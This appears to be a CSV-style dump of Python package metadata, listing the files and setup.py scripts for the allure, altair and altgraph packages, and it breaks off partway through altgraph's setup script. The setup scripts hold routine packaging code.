allure-behave-2.9.45,0,1,1,1,1,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt background.feature description.feature hook.feature label.feature link.feature no_skipped.feature scenario.feature scenario_outline.feature severity.feature step.feature behave_steps.py dummy_steps.py report_steps.py tag.feature test_plan.feature unicode.feature PKG-INFO README.rst setup.cfg setup.py formatter.py hooks.py listener.py utils.py __init__.py tox.ini,"import os
from setuptools import setup

PACKAGE = ""allure-behave""

classifiers = [
    'Development Status :: 5 - Production/Stable',
    'Intended Audience :: Developers',
    'License :: OSI Approved :: Apache Software License',
    'Topic :: Software Development :: Quality Assurance',
    'Topic :: Software Development :: Testing',
    'Topic :: Software Development :: Testing :: BDD',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3 :: Only',
    'Programming Language :: Python :: 3.6',
    'Programming Language :: Python :: 3.7',
    'Programming Language :: Python :: 3.8',
    'Programming Language :: Python :: 3.9',
]

setup_requires = [
    ""setuptools_scm""
]

install_requires = [
    ""behave>=1.2.5"",
]


def prepare_version():
    from setuptools_scm import get_version
    configuration = {""root"": "".."", ""relative_to"": __file__}
    version = get_version(**configuration)
    install_requires.append(""allure-python-commons=={version}"".format(version=version))
    return configuration


def get_readme(fname):
    return open(os.path.join(os.path.dirname(__file__), fname)).read()


def main():
    setup(
        name=PACKAGE,
        use_scm_version=prepare_version,
        description=""Allure behave integration"",
        url=""https://github.com/allure-framework/allure-python"",
        author=""QAMetaSoftware, Stanislav Seliverstov"",
        author_email=""sseliverstov@qameta.io"",
        license=""Apache-2.0"",
        classifiers=classifiers,
        keywords=""allure reporting behave"",
        long_description=get_readme('README.rst'),
        packages=[""allure_behave""],
        package_dir={""allure_behave"": ""src""},
        setup_requires=setup_requires,
        install_requires=install_requires
    )

if __name__ == '__main__':
    main()

",1
allure-pytest-2.9.45,0,1,1,1,1,0,1,0,dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt attachment.rst attachment_fixture.rst attachment_step.rst description.rst dynamic_description.rst display_name.rst dynamic_display_name.rst bdd_label.rst dynamic_bdd_label.rst select_tests_by_bdd.rst custom_label.rst class_severity.rst module_severity.rst select_tests_by_severity.rst severity.rst custom_suite.rst module_level_custom_suite.rst dynamic_link.rst link.rst step.rst step_placeholder.rst PKG-INFO README.rst setup.cfg setup.py helper.py listener.py plugin.py utils.py __init__.py attachment_class_test.py attachment_fixture_test.py attachment_hook_test.py attachment_parametrized_test.py attachment_step_test.py attachment_test.py __init__.py capture_attach_test.py __init__.py description_test.py dynamic_description_test.py __init__.py display_name_test.py dynamic_display_name_test.py __init__.py duration_time_test.py __init__.py fixture_finalized_test.py fixture_test.py __init__.py parametrized_fixture_test.py yield_fixture_test.py __init__.py history_id_test.py __init__.py bdd_label_test.py dynamic_bdd_label_test.py select_bdd_test.py __init__.py custom_label_test.py __init__.py regression_test.py __init__.py class_severity_test.py module_severity_test.py select_severity_test.py severity_test.py __init__.py custom_suite.py default_suite_test.py module_level_custom_suite_test.py __init__.py tag_test.py __init__.py __init__.py dynamic_link_test.py link_pattern_test.py link_test.py __init__.py metafunc_test.py parametrization_test.py __init__.py base_call_status_test.py base_setup_status_test.py base_step_status_test.py base_teardown_status_test.py skip_call_status_test.py skip_setup_status_test.py skip_step_status_test.py skip_teardown_status_test.py xfail_call_status_test.py xfail_setup_status_test.py xfail_step_status_test.py xfail_teardown_status_test.py __init__.py outside_step_test.py step_parameters.py step_placeholder_test.py step_test.py __init__.py unicode_identifier_test.py __init__.py __init__.py conftest.py select_test_from_testplan_test.py set_testcase_id_test.py __init__.py pytest_check_test.py __init__.py pytest_doctest_test.py __init__.py pytest_flakes_test.py __init__.py pytest_lazy_fixture_test.py __init__.py pytest_rerunfailures_test.py __init__.py pytest_xdist_select_test.py __init__.py __init__.py __init__.py tox.ini __init__.py,"import os,sys
from setuptools import setup
from pkg_resources import require, DistributionNotFound, VersionConflict

try:
    require('pytest-allure-adaptor')
    print(""""""
    You have pytest-allure-adaptor installed.
    You need to remove pytest-allure-adaptor from your site-packages
    before installing allure-pytest, or conflicts may result.
    """""")
    sys.exit()
except (DistributionNotFound, VersionConflict):
    pass

PACKAGE = ""allure-pytest""

classifiers = [
    'Development Status :: 5 - Production/Stable',
    'Framework :: Pytest',
    'Intended Audience :: Developers',
    'License :: OSI Approved :: Apache Software License',
    'Topic :: Software Development :: Quality Assurance',
    'Topic :: Software Development :: Testing',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3 :: Only',
]

setup_requires = [
    ""setuptools_scm""
]


install_requires = [
    ""pytest>=4.5.0"",
    ""six>=1.9.0"",
]


def prepare_version():
    from setuptools_scm import get_version
    configuration = {""root"": "".."",  ""relative_to"": __file__}
    version = get_version(**configuration)
    install_requires.append(""allure-python-commons=={version}"".format(version=version))
    return configuration


def get_readme(fname):
    return open(os.path.join(os.path.dirname(__file__), fname)).read()


def main():
    setup(
        name=PACKAGE,
        use_scm_version=prepare_version,
        description=""Allure pytest integration"",
        url=""https://github.com/allure-framework/allure-python"",
        author=""QAMetaSoftware, Stanislav Seliverstov"",
        author_email=""sseliverstov@qameta.io"",
        license=""Apache-2.0"",
        classifiers=classifiers,
        keywords=""allure reporting pytest"",
        long_description=get_readme('README.rst'),
        packages=[""allure_pytest""],
        package_dir={""allure_pytest"": ""src""},
        entry_points={""pytest11"": [""allure_pytest = allure_pytest.plugin""]},
        setup_requires=setup_requires,
        install_requires=install_requires
    )

if __name__ == '__main__':
    main()

",1
allure-python-commons-2.9.45,0,1,1,1,1,0,1,0,allure.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py lifecycle.py logger.py mapping.py model2.py reporter.py types.py utils.py _allure.py _compat.py _core.py _hooks.py __init__.py tox.ini,"from setuptools import setup

PACKAGE = ""allure-python-commons""

classifiers = [
    'Development Status :: 5 - Production/Stable',
    'Intended Audience :: Developers',
    'License :: OSI Approved :: Apache Software License',
    'Topic :: Software Development :: Quality Assurance',
    'Topic :: Software Development :: Testing',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3 :: Only',
]

install_requires = [
    ""attrs>=16.0.0"",
    ""six>=1.9.0"",
    ""pluggy>=0.4.0"",
    ""enum34;python_version<'3.4'"",
]


def main():
    setup(
        name=PACKAGE,
        use_scm_version={""root"": "".."", ""relative_to"": __file__},
        setup_requires=['setuptools_scm'],
        description=""Common module for integrate allure with python-based frameworks"",
        url=""https://github.com/allure-framework/allure-python"",
        author=""QAMetaSoftware, Stanislav Seliverstov"",
        author_email=""sseliverstov@qameta.io"",
        license=""Apache-2.0"",
        classifiers=classifiers,
        keywords=""allure reporting report-engine"",
        packages=[""allure_commons""],
        package_dir={""allure_commons"": 'src'},
        install_requires=install_requires,
        py_modules=['allure', 'allure_commons'],
        python_requires='>=3.5'
    )


if __name__ == '__main__':
    main()
",0
altair-4.2.0,0,1,1,1,0,0,0,0,datasets.py airports.py airports_count.py airport_connections.py anscombe_plot.py area_chart_gradient.py bar_and_line_with_dual_axis.py bar_chart_horizontal.py bar_chart_sorted.py bar_chart_trellis_compact.py bar_chart_with_highlighted_bar.py bar_chart_with_highlighted_segment.py bar_chart_with_labels.py bar_chart_with_mean_line.py bar_chart_with_negatives.py bar_rounded.py bar_with_rolling_mean.py beckers_barley_trellis_plot.py beckers_barley_wrapped_facet.py binned_heatmap.py binned_scatterplot.py boxplot.py bubble_plot.py bump_chart.py candlestick_chart.py choropleth.py choropleth_repeat.py co2_concentration.py comet_chart.py connected_scatterplot.py cumulative_count_chart.py cumulative_wiki_donations.py density_facet.py density_stack.py diverging_stacked_bar_chart.py donut_chart.py dot_dash_plot.py errorbars_with_ci.py errorbars_with_std.py falkensee.py filled_step_chart.py gantt_chart.py gapminder_bubble_plot.py grouped_bar_chart.py grouped_bar_chart_horizontal.py grouped_bar_chart_with_error_bars.py hexbins.py histogram_responsive.py histogram_with_a_global_mean_overlay.py horizontal_stacked_bar_chart.py horizon_graph.py image_tooltip.py interactive_brush.py interactive_cross_highlight.py interactive_layered_crossfilter.py interactive_legend.py interactive_scatter_plot.py interval_selection.py iowa_electricity.py isotype.py isotype_emoji.py isotype_grid.py layered_area_chart.py layered_bar_chart.py layered_chart_bar_mark.py layered_chart_with_dual_axis.py layered_heatmap_text.py layered_histogram.py layer_line_color_rule.py line_chart_with_color_datum.py line_chart_with_cumsum.py line_chart_with_datum.py line_chart_with_generator.py line_chart_with_points.py line_percent.py line_with_ci.py line_with_log_scale.py london_tube.py multifeature_scatter_plot.py multiline_highlight.py multiline_tooltip.py multiple_interactions.py multiple_marks.py multi_series_line.py natural_disasters.py normalized_stacked_area_chart.py normalized_stacked_bar_chart.py normed_parallel_coordinates.py one_dot_per_zipcode.py pacman_chart.py parallel_coordinates.py percentage_of_total.py pie_chart.py pie_chart_with_labels.py poly_fit_regression.py pyramid.py radial_chart.py ranged_dot_plot.py ridgeline_plot.py scatter_href.py scatter_linked_brush.py scatter_linked_table.py scatter_marginal_hist.py scatter_matrix.py scatter_qq.py scatter_tooltips.py scatter_with_histogram.py scatter_with_labels.py scatter_with_layered_histogram.py scatter_with_loess.py scatter_with_minimap.py scatter_with_rolling_mean.py seattle_weather_interactive.py selection_histogram.py selection_layer_bar_month.py select_detail.py select_mark_area.py simple_bar_chart.py simple_heatmap.py simple_histogram.py simple_line_chart.py simple_scatter_with_errorbars.py simple_stacked_area_chart.py slope_graph.py sorted_error_bars_with_ci.py stacked_bar_chart.py stacked_bar_chart_sorted_segments.py stacked_bar_chart_with_text.py stem_and_leaf.py step_chart.py streamgraph.py stripplot.py strip_plot.py table_bubble_plot_github.py test_examples.py __init__.py top_k_items.py top_k_letters.py top_k_with_others.py trail_marker.py trellis_area.py trellis_area_sort_array.py trellis_histogram.py trellis_scatter_plot.py trellis_stacked_bar_chart.py us_employment.py us_incomebrackets_by_state_facet.py us_population_over_time.py us_population_over_time_facet.py us_population_pyramid_over_time.py us_state_capitals.py violin_plot.py weather_heatmap.py wheat_wages.py wilkinson-dot-plot.py window_rank.py wind_vector_map.py world_map.py world_projections.py __init__.py consts.py core.py funcs.py test_expr.py __init__.py __init__.py altairgallery.py altairplot.py schematable.py utils.py __init__.py test_magics.py __init__.py core.py data.py deprecation.py display.py execeval.py html.py mimebundle.py plugin_registry.py save.py schemapi.py server.py test_core.py test_data.py test_deprecation.py test_execeval.py test_html.py test_mimebundle.py test_plugin_registry.py test_schemapi.py test_server.py test_utils.py __init__.py theme.py __init__.py data.py display.py test_import.py __init__.py data.py display.py core.py vega-schema.json __init__.py __init__.py __init__.py api.py data.py display.py schema.py test_common.py __init__.py api.py data.py display.py channels.py core.py mixins.py vega-lite-schema.json __init__.py test_api.py test_data.py test_display.py test_geo_interface.py test_renderers.py test_theme.py __init__.py theme.py _deprecated.py __init__.py api.py data.py display.py channels.py core.py mixins.py vega-lite-schema.json __init__.py test_api.py test_data.py test_display.py test_geo_interface.py test_renderers.py test_theme.py __init__.py theme.py __init__.py __init__.py _magics.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CONTRIBUTING.md LICENSE Makefile MANIFEST.in NOTES_FOR_MAINTAINERS.md PKG-INFO pyproject.toml README.md RELEASING.md requirements.txt requirements_dev.txt setup.cfg setup.py,"import io
import os
import re

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

# ==============================================================================
# Utilities
# ==============================================================================


def read(path, encoding=""utf-8""):
    path = os.path.join(os.path.dirname(__file__), path)
    with io.open(path, encoding=encoding) as fp:
        return fp.read()


def get_install_requirements(path):
    content = read(path)
    return [req for req in content.split(""\n"") if req != """" and not req.startswith(""#"")]


def version(path):
    """"""Obtain the package version from a python file e.g. pkg/__init__.py

    See <https://packaging.python.org/en/latest/single_source_version.html>.
    """"""
    version_file = read(path)
    version_match = re.search(
        r""""""^__version__ = ['""]([^'""]*)['""]"""""", version_file, re.M
    )
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")


HERE = os.path.abspath(os.path.dirname(__file__))


# From https://github.com/jupyterlab/jupyterlab/blob/master/setupbase.py, BSD licensed
def find_packages(top=HERE):
    """"""
    Find all of the packages.
    """"""
    packages = []
    for d, dirs, _ in os.walk(top, followlinks=True):
        if os.path.exists(os.path.join(d, ""__init__.py"")):
            packages.append(os.path.relpath(d, top).replace(os.path.sep, "".""))
        elif d != top:
            # Do not look for packages in subfolders if current is not a package
            dirs[:] = []
    return packages


setup(
    name=""altair"",
    version=version(""altair/__init__.py""),
    description=""Altair: A declarative statistical visualization library for Python."",
    long_description=read(""README.md""),
    long_description_content_type=""text/markdown"",
    author=""Brian E. Granger / Jake VanderPlas"",
    author_email=""jakevdp@gmail.com"",
    url=""http://altair-viz.github.io"",
    download_url=""http://github.com/altair-viz/altair/"",
    license=""BSD 3-clause"",
    packages=find_packages(),
    include_package_data=True,
    install_requires=get_install_requirements(""requirements.txt""),
    python_requires="">=3.7"",
    extras_require={""dev"": get_install_requirements(""requirements_dev.txt"")},
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Intended Audience :: Science/Research"",
        ""License :: OSI Approved :: BSD License"",
        ""Natural Language :: English"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
    ],
)
",1
altair_data_server-0.4.1,0,1,1,1,0,0,0,0,test_altair_server.py test_entrypoint.py test_provider.py __init__.py _altair_server.py _background_server.py _provide.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.md LICENSE Makefile MANIFEST.in PKG-INFO README.md RELEASING.md requirements.txt setup.cfg setup.py,"import io
import os
import re

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

# ==============================================================================
# Utilities
# ==============================================================================


def read(path, encoding=""utf-8""):
    path = os.path.join(os.path.dirname(__file__), path)
    with io.open(path, encoding=encoding) as fp:
        return fp.read()


def get_install_requirements(path):
    content = read(path)
    return [req for req in content.split(""\n"") if req != """" and not req.startswith(""#"")]


def version(path):
    """"""Obtain the packge version from a python file e.g. pkg/__init__.py

    See <https://packaging.python.org/en/latest/single_source_version.html>.
    """"""
    version_file = read(path)
    version_match = re.search(
        r""""""^__version__ = ['""]([^'""]*)['""]"""""", version_file, re.M
    )
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")


HERE = os.path.abspath(os.path.dirname(__file__))

# From https://github.com/jupyterlab/jupyterlab/blob/master/setupbase.py, BSD licensed
def find_packages(top=HERE):
    """"""
    Find all of the packages.
    """"""
    packages = []
    for d, dirs, _ in os.walk(top, followlinks=True):
        if os.path.exists(os.path.join(d, ""__init__.py"")):
            packages.append(os.path.relpath(d, top).replace(os.path.sep, "".""))
        elif d != top:
            # Do not look for packages in subfolders if current is not a package
            dirs[:] = []
    return packages


setup(
    name=""altair_data_server"",
    version=version(""altair_data_server/__init__.py""),
    description=""A background data server for Altair charts."",
    long_description=read(""README.md""),
    long_description_content_type=""text/markdown"",
    author=""Jake VanderPlas"",
    author_email=""jakevdp@google.com"",
    url=""http://github.com/altair-viz/altair_data_server/"",
    download_url=""http://github.com/altair-viz/altair_data_server/"",
    license=""BSD 3-clause"",
    packages=find_packages(),
    include_package_data=True,
    install_requires=get_install_requirements(""requirements.txt""),
    python_requires="">=3.6"",
    entry_points={
        ""altair.vegalite.v2.data_transformer"": [
            ""data_server=altair_data_server:data_server"",
            ""data_server_proxied=altair_data_server:data_server_proxied"",
        ],
        ""altair.vegalite.v3.data_transformer"": [
            ""data_server=altair_data_server:data_server"",
            ""data_server_proxied=altair_data_server:data_server_proxied"",
        ],
        ""altair.vegalite.v4.data_transformer"": [
            ""data_server=altair_data_server:data_server"",
            ""data_server_proxied=altair_data_server:data_server_proxied"",
        ],
    },
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Intended Audience :: Science/Research"",
        ""License :: OSI Approved :: BSD License"",
        ""Natural Language :: English"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
    ],
)
",1
altair_saver-0.5.0,0,1,1,1,0,0,0,0,bar.pdf bar.png bar.svg bar.vg.json bar.vl.json scatter.pdf scatter.png scatter.svg scatter.vg.json scatter.vl.json test_basic.py test_html.py test_node.py test_selenium.py _utils.py __init__.py _basic.py _html.py _node.py _saver.py _selenium.py __init__.py test_core.py test_entrypoint.py test_utils.py __init__.py types.py _core.py _utils.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.md LICENSE Makefile MANIFEST.in mypy.ini PKG-INFO pyproject.toml README.md RELEASING.md requirements-dev.txt requirements.txt setup.cfg setup.py,"import io
import os
import re

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup


def read(path, encoding=""utf-8""):
    path = os.path.join(os.path.dirname(__file__), path)
    with io.open(path, encoding=encoding) as fp:
        return fp.read()


def get_install_requirements(path):
    content = read(path)
    return [req for req in content.split(""\n"") if req != """" and not req.startswith(""#"")]


def version(path):
    """"""Obtain the packge version from a python file e.g. pkg/__init__.py

    See <https://packaging.python.org/en/latest/single_source_version.html>.
    """"""
    version_file = read(path)
    version_match = re.search(
        r""""""^__version__ = ['""]([^'""]*)['""]"""""", version_file, re.M
    )
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")


HERE = os.path.abspath(os.path.dirname(__file__))


# From https://github.com/jupyterlab/jupyterlab/blob/master/setupbase.py,
# BSD licensed
def find_packages(top=HERE):
    """"""
    Find all of the packages.
    """"""
    packages = []
    for d, dirs, _ in os.walk(top, followlinks=True):
        if os.path.exists(os.path.join(d, ""__init__.py"")):
            packages.append(os.path.relpath(d, top).replace(os.path.sep, "".""))
        elif d != top:
            # Do not look for packages in subfolders
            # if current is not a package
            dirs[:] = []
    return packages


setup(
    name=""altair_saver"",
    version=version(""altair_saver/__init__.py""),
    description=""Altair extension for saving charts to various formats."",
    long_description=read(""README.md""),
    long_description_content_type=""text/markdown"",
    author=""Jake VanderPlas"",
    author_email=""jakevdp@gmail.com"",
    url=""http://github.com/altair-viz/altair_saver/"",
    download_url=""http://github.com/altair-viz/altair_saver/"",
    license=""MIT"",
    packages=find_packages(),
    include_package_data=True,
    install_requires=get_install_requirements(""requirements.txt""),
    entry_points={
        ""altair.vegalite.v4.renderer"": [""altair_saver=altair_saver:render""],
        ""altair.vega.v5.renderer"": [""altair_saver=altair_saver:render""],
    },
    python_requires="">=3.6"",
    classifiers=[
        ""Environment :: Console"",
        ""Intended Audience :: Science/Research"",
        ""License :: OSI Approved :: BSD License"",
        ""Natural Language :: English"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
    ],
)
",0
altair_viewer-0.4.0,0,1,1,1,0,0,0,0,listing.json vega-5.10.1.js vega-5.21.0.js vega-5.9.2.js vega-embed-6.2.2.js vega-embed-6.20.0.js vega-embed-6.5.2.js vega-lite-4.0.2.js vega-lite-4.17.0.js vega-lite-4.8.1.js favicon.ico test_entrypoint.py test_event_provider.py test_scripts.py test_utils.py test_viewer.py __init__.py _event_provider.py _scripts.py _utils.py _viewer.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.md LICENSE Makefile MANIFEST.in mypy.ini PKG-INFO pyproject.toml README.md RELEASING.md requirements-dev.txt requirements.txt setup.cfg setup.py,"import io
import os
import re

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

# ==============================================================================
# Utilities
# ==============================================================================


def read(path, encoding=""utf-8""):
    path = os.path.join(os.path.dirname(__file__), path)
    with io.open(path, encoding=encoding) as fp:
        return fp.read()


def get_install_requirements(path):
    content = read(path)
    return [req for req in content.split(""\n"") if req != """" and not req.startswith(""#"")]


def version(path):
    """"""Obtain the packge version from a python file e.g. pkg/__init__.py

    See <https://packaging.python.org/en/latest/single_source_version.html>.
    """"""
    version_file = read(path)
    version_match = re.search(
        r""""""^__version__ = ['""]([^'""]*)['""]"""""", version_file, re.M
    )
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")


HERE = os.path.abspath(os.path.dirname(__file__))


# From https://github.com/jupyterlab/jupyterlab/blob/master/setupbase.py, BSD licensed
def find_packages(top=HERE):
    """"""
    Find all of the packages.
    """"""
    packages = []
    for d, dirs, _ in os.walk(top, followlinks=True):
        if os.path.exists(os.path.join(d, ""__init__.py"")):
            packages.append(os.path.relpath(d, top).replace(os.path.sep, "".""))
        elif d != top:
            # Do not look for packages in subfolders if current is not a package
            dirs[:] = []
    return packages


setup(
    name=""altair_viewer"",
    version=version(""altair_viewer/__init__.py""),
    description=""Viewer for Altair and Vega-Lite visualizations."",
    long_description=read(""README.md""),
    long_description_content_type=""text/markdown"",
    author=""Jake VanderPlas"",
    author_email=""jakevdp@google.com"",
    url=""http://github.com/altair-viz/altair_viewer/"",
    download_url=""http://github.com/altair-viz/altair_viewer/"",
    license=""BSD 3-clause"",
    packages=find_packages(),
    include_package_data=True,
    install_requires=get_install_requirements(""requirements.txt""),
    python_requires="">=3.6"",
    entry_points={
        ""altair.vegalite.v4.renderer"": [""altair_viewer=altair_viewer:render""],
    },
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Intended Audience :: Science/Research"",
        ""License :: OSI Approved :: BSD License"",
        ""Natural Language :: English"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
    ],
)
",1
altgraph-0.17.2,1,1,1,1,0,0,0,0,Dot.py Graph.py GraphAlgo.py GraphStat.py GraphUtil.py ObjectGraph.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt zip-safe test_altgraph.py test_dot.py test_graph.py test_graphstat.py test_graphutil.py test_object_graph.py __init__.py changelog.rst conf.py core.rst dot.rst graph.rst graphalgo.rst graphstat.rst graphutil.rst index.rst license.rst Makefile objectgraph.rst icons.html LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py tox.ini,"""""""
Shared setup file for simple python packages. Uses a setup.cfg that
is the same as the distutils2 project, unless noted otherwise.

It exists for two reasons:
1) This makes it easier to reuse setup.py code between my own
   projects

2) Easier migration to distutils2 when that catches on.

Additional functionality:

* Section metadata:
    requires-test:  Same as 'tests_require' option for setuptools.

""""""

import os
import platform
import re
import sys
from distutils import log
from fnmatch import fnmatch

from setuptools import Command, setup
from setuptools.command import egg_info

if sys.version_info[0] == 2:
    from ConfigParser import RawConfigParser, NoOptionError, NoSectionError
else:
    from configparser import RawConfigParser, NoOptionError, NoSectionError

ROOTDIR = os.path.dirname(os.path.abspath(__file__))


#
#
#
# Parsing the setup.cfg and converting it to something that can be
# used by setuptools.setup()
#
#
#


def eval_marker(value):
    """"""
    Evaluate an distutils2 environment marker.

    This code is unsafe when used with hostile setup.cfg files,
    but that's not a problem for our own files.
    """"""
    value = value.strip()

    class M:
        def __init__(self, **kwds):
            for k, v in kwds.items():
                setattr(self, k, v)

    variables = {
        ""python_version"": ""%d.%d"" % (sys.version_info[0], sys.version_info[1]),
        ""python_full_version"": sys.version.split()[0],
        ""os"": M(name=os.name),
        ""sys"": M(platform=sys.platform),
        ""platform"": M(version=platform.version(), machine=platform.machine()),
    }

    return bool(eval(value, variables, variables))

    return True


def _opt_value(cfg, into, section, key, transform=None):
    try:
        v = cfg.get(section, key)
        if transform != _as_lines and "";"" in v:
            v, marker = v.rsplit("";"", 1)
            if not eval_marker(marker):
                return

            v = v.strip()

        if v:
            if transform:
                into[key] = transform(v.strip())
            else:
                into[key] = v.strip()

    except (NoOptionError, NoSectionError):
        pass


def _as_bool(value):
    if value.lower() in (""y"", ""yes"", ""on""):
        return True
    elif value.lower() in (""n"", ""no"", ""off""):
        return False
    elif value.isdigit():
        return bool(int(value))
    else:
        raise ValueError(value)


def _as_list(value):
    return value.split()


def _as_lines(value):
    result = []
    for v in value.splitlines():
        if "";"" in v:
            v, marker = v.rsplit("";"", 1)
            if not eval_marker(marker):
                continue

            v = v.strip()
            if v:
                result.append(v)
        else:
            result.append(v)
    return result


def _map_requirement(value):
    m = re.search(r""(\S+)\s*(?:\((.*)\))?"", value)
    name = m.group(1)
    version = m.group(2)

    if version is None:
        return name

    else:
        mapped = []
        for v in version.split("",""):
            v = v.strip()
            if v[0].isdigit():
                # Checks for a specific version prefix
                m = v.rsplit(""."", 1)
                mapped.append("">=%s,<%s.%s"" % (v, m[0], int(m[1]) + 1))

            else:
                mapped.append(v)
        return ""%s %s"" % (name, "","".join(mapped))


def _as_requires(value):
    requires = []
    for req in value.splitlines():
        if "";"" in req:
            req, marker = req.rsplit("";"", 1)
            if not eval_marker(marker):
                continue
            req = req.strip()

        if not req:
            continue
        requires.append(_map_requirement(req))
    return requires


def parse_setup_cfg():
    cfg = RawConfigParser()
    r = cfg.read([os.path.join(ROOTDIR, ""setup.cfg"")])
    if len(r) != 1:
        print(""Cannot read 'setup.cfg'"")
        sys.exit(1)

    metadata = {
        ""name"": cfg.get(""x-metadata"", ""name""),
        ""version"": cfg.get(""x-metadata"", ""version""),
        ""description"": cfg.get(""x-metadata"", ""description""),
    }

    _opt_value(cfg, metadata, ""x-metadata"", ""license"")
    _opt_value(cfg, metadata, ""x-metadata"", ""maintainer"")
    _opt_value(cfg, metadata, ""x-metadata"", ""maintainer_email"")
    _opt_value(cfg, metadata, ""x-metadata"", ""author"")
    _opt_value(cfg, metadata, ""x-metadata"", ""author_email"")
    _opt_value(cfg, metadata, ""x-metadata"", ""url"")
    _opt_value(cfg, metadata, ""x-metadata"", ""download_url"")
    _opt_value(cfg, metadata, ""x-metadata"", ""classifiers"", _as_lines)
    _opt_value(cfg, metadata, ""x-metadata"", ""platforms"", _as_list)
    _opt_value(cfg, metadata, ""x-metadata"", ""packages"", _as_list)
    _opt_value(cfg, metadata, ""x-metadata"", ""keywords"", _as_list)

    try:
        v = cfg.get(""x-metadata"", ""requires-dist"")

    except (NoOptionError, NoSectionError):
        pass

    else:
        requires = _as_requires(v)
        if requires:
            metadata[""install_requires""] = requires

    try:
        v = cfg.get(""x-metadata"", ""requires-test"")

    except (NoOptionError, NoSectionError):
        pass

    else:
        requires = _as_requires(v)
        if requires:
            metadata[""tests_require""] = requires

    try:
        v = cfg.get(""x-metadata"", ""long_description_file"")
    except (NoOptionError, NoSectionError):
        pass

    else:
        parts = []
        for nm in v.split():
            fp = open(nm, ""r"")
            parts.append(fp.read())
            fp.close()

        metadata[""long_description""] = ""\n\n"".join(parts)
        metadata[""long_description_content_type""] = ""text/x-rst; charset=UTF-8""

    try:
        v = cfg.get(""x-metadata"", ""zip-safe"")
    except (NoOptionError, NoSectionError):
        pass

    else:
        metadata[""zip_safe""] = _as_bool(v)

    try:
        v = cfg.get(""x-metadata"", ""console_scripts"")
    except (NoOptionError, NoSectionError):
        pass

    else:
        if ""entry_points"" not in metadata:
            metadata[""entry_points""] = {}

        metadata[""entry_points""][""console_scripts""] = v.splitlines()

    if sys.version_info[:2] <= (2, 6):
        try:
            metadata[""tests_require""] += "", unittest2""
        except KeyError:
            metadata[""tests_require""] = ""unittest2""

    return metadata


#
#
#
# Definitions of custom commands
#
#
#


def recursiveGlob(root, pathPattern):
    """"""
    Recursively look for files matching 'pathPattern'. Return a list
    of matching files/directories.
    """"""
    result = []

    for rootpath, _dirnames, filenames in os.walk(root):
        for fn in filenames:
            if fnmatch(fn, pathPattern):
                result.append(os.path.join(rootpath, fn))
    return result


def importExternalTestCases(unittest, pathPattern=""test_*.py"", root=""."", package=None):
    """"""
    Import all unittests in the PyObjC tree starting at 'root'
    """"""

    testFiles = recursiveGlob(root, pathPattern)
    testModules = [
        x[len(root) + 1 : -3].replace(""/"", ""."") for x in testFiles  # noqa: E203
    ]  # noqa: E203
    if package is not None:
        testModules = [(package + ""."" + m) for m in testModules]

    suites = []

    for modName in testModules:
        try:
            module = __import__(modName)
        except ImportError:
            print(""SKIP %s: %s"" % (modName, sys.exc_info()[1]))
            continue

        if ""."" in modName:
            for elem in modName.split(""."")[1:]:
                module = getattr(module, elem)

        s = unittest.defaultTestLoader.loadTestsFromModule(module)
        suites.append(s)

    return unittest.TestSuite(suites)


class my_egg_info(egg_info.egg_info):
    def run(self):
        egg_info.egg_info.run(self)

        path = os.path.join(self.egg_info, ""PKG-INFO"")

        with open(path, ""r"") as fp:
            contents = fp.read()

        try:
            before, after = contents.split(""\n\n"", 1)
        except ValueError:
            before = contents
            after = """"

        with open(path, ""w"") as fp:
            fp.write(before)
            fp.write(
                ""\nProject-URL: Documentation, https://altgraph.readthedocs.io/en/latest/\n""  # noqa: B950
            )
            fp.write(
                ""Project-URL: Issue tracker, https://github.com/ronaldoussoren/altgraph/issues\n""  # noqa: B950
            )
            fp.write(
                ""Project-URL: Repository, https://github.com/ronaldoussoren/altgraph\n\n""  # noqa: B950
            )
            fp.write(after)


class my_test(Command):
    description = ""run test suite""
    user_options = [(""verbosity="", None, ""print what tests are run"")]

    def initialize_options(self):
        self.verbosity = ""1""

    def finalize_options(self):
        if isinstance(self.verbosity, str):
            self.verbosity = int(self.verbosity)

    def cleanup_environment(self):
        ei_cmd = self.get_finalized_command(""egg_info"")
        egg_name = ei_cmd.egg_name.replace(""-"", ""_"")

        to_remove = []
        for dirname in sys.path:
            bn = os.path.basename(dirname)
            if bn.startswith(egg_name + ""-""):
                to_remove.append(dirname)

        for dirname in to_remove:
            log.info(""removing installed %r from sys.path before testing"" % (dirname,))
